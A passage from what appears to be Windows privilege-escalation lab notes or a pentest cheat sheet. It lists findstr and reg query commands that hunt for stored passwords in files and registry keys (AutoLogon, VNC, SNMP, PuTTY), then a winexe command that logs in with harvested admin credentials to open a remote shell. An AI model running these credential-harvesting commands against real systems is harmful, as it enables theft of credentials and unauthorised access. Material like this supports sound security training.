he registry can be searched for keys and values that contain the word "password":

	reg query HKLM /f password /t REG_SZ /s

If you want to save some time, query this specific key to find admin AutoLogon credentials:

	reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"


- Search for passwords 

  - In Files

    ```
      findstr /si password *.txt
      findstr /si password *.xml
      findstr /si password *.ini

      #Find all those strings in config files.
      dir /s *pass* == *cred* == *vnc* == *.config*

      # Find all passwords in all files.
      findstr /spin "password" *.*
      findstr /spin "password" *.*
    ```
    
  - In Registry
  
    ```
    # VNC
    reg query "HKCU\Software\ORL\WinVNC3\Password"

    # Windows autologin
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    # SNMP Paramters
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

    # Putty
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

    # Search for password in registry
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

    ```


Login with found credentials

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

	winexe -U 'admin%password' //10.10.184.197 cmd.exe